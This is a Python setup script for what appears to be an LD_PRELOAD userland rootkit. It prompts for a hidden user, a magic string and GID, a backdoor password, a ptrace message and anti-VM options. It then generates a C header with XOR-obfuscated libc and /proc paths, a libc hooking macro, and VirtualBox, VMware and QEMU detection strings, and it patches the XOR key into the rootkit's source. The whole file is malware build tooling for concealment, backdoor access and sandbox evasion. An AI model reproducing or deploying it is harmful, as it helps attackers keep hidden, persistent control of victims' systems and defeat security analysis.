from xor import xor 
import os 
import subprocess 

class col: 
    BOLD = '\033[1m'
    ENDC = '\033[0m'
    BLNK = '\033[5m'
    PASS = '\033[32m'
    FAIL = '\033[31m'
    NORM = '\033[34m'

def main(): 
    with open("/etc/lsb-release", "r") as f: 
        lines = f.readlines() 
        distro = [i.split("=")[1].replace("\n", "") for i in lines if i.split("=")[0] == "DISTRIB_ID"]
    '''
    if os.path.isfile("/etc/nscd.conf") == False: 
        print("nscd is missing, installing")
        if distro.lower() == "ubuntu" or distro.lower() == "debian":
            apt = subprocess.Popen(['apt', 'install', 'nscd'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE)
            stdout, stderr = apt.communicate()
            stdout, stderr
    '''
    while True: 
        key = input(col.BOLD + col.NORM + "[>] " + col.ENDC + "key: ")
        if len(key) != 1: 
            print(col.BOLD + col.BLNK + col.FAIL + "[!] " + col.ENDC + "Key must be single ASCII char.")
        else: 
            break 
    user = input(col.BOLD + col.NORM + "[>] " + col.ENDC + "user: ")
    magic = input(col.BOLD + col.NORM + "[>] " + col.ENDC + "magic string: ")
    magicgid = input(col.BOLD + col.NORM + "[>] " +  col.ENDC + "magic gid: ")
    execpw = input(col.BOLD + col.NORM + "[>] " + col.ENDC + "password: ")
    ptrace = input(col.BOLD + col.NORM + "[>] " + col.ENDC + "ptrace msg: ")
    debug = input(col.BOLD + col.NORM + "[>] " + col.ENDC + "debug? [y/n]: ")
    antivm = input(col.BOLD + col.NORM + "[>] " + col.ENDC + "anti-vm? [y/n]: ")
    try:
        f = open("rkconst.h", "w")
        f.write("#ifndef RTLD_NEXT\n#define RTLD_NEXT ((void *) -11)\n#endif\n#define HOOK(func) old##_##func = dlsym(RTLD_NEXT, #func)\n#define CLEAN(var) clean(var, strlen(var))\n")
        f.write("#define LIBC "  + "\"" + xor("/lib/libc.so.6", key) + "\"" + "\n")
        f.write("#define PROC_PATH " + "\"" + xor("/proc/self/fd/%d", key) + "\"" + "\n")
        f.write("#define PROC " + "\"" + xor("/proc", key) + "\"" + "\n")
        f.write("#define USER " + "\"" + xor(user, key) + "\"" + "\n")
        f.write("#define MAGIC " + "\"" + xor(magic, key) + "\"" + "\n")
        f.write("#define EXECPW " + "\"" + xor(execpw, key) + "\"" + "\n")
        f.write("#define PTRACE_MSG " + "\"" + xor(ptrace, key) + "\"" + "\n")
        f.write("#define MAGICGID "  + magicgid + "\n")
        if debug.lower() == "y": 
            f.write("#define DEBUG\n")
        if antivm.lower() == "y": 
            f.write("#define ANTIVM\n")
        f.write("//----------ANTI-VM STUFF----------\n")
        f.write("#define VBOX_STR " + "\"" + xor("VBoxVBoxVBox", key) + "\"" + "\n")
        f.write("#define VMWARE_STR " + "\"" + xor("VMwareVMware", key) + "\"" + "\n")
        f.write("#define QEMU_STR " + "\"" + xor("TCGTCGTCGTCG", key) + "\"" + "\n") 
        f.close()
        here = os.path.dirname(os.path.realpath(__file__))
        subdir = "utils"
        filename = "xor.c" 
        path = os.path.join(here, subdir, filename)
        with open(path, "r") as f:
            data = f.readlines()
        data[2] = "for(int i=0; i<strlen(s); i++) s[i] ^= " + str(hex(ord(key))) + ";\n"
        with open(path, "w") as f: 
            f.write(''.join(data))
        print(col.BOLD + col.PASS + "[~] " + col.ENDC + "Config successfully written.")
    except IOError: 
        print(col.BOLD + col.BLNK + col.FAIL + "[!] " + col.ENDC + "Error writing to file.")
        exit() 
main() 
